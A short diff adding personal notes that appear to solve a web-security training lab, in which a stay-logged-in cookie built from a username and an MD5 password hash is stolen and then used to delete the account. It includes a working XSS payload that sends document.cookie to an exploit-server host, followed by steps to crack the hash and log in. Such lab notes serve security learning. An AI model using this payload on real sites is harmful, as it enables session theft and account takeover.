@@ -1,0 +1,15 @@
+base64("weiner:"+"MD5hash(password)")
+
+uses the same stayloggedin cookie 
+
+
+using the xss cookie exfiltration paylaod 
+
+
+<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
+
+
+only works when there's no restrictive script blocking 
+
+
+get the cookie decode and crack the hash and login and delete the account 
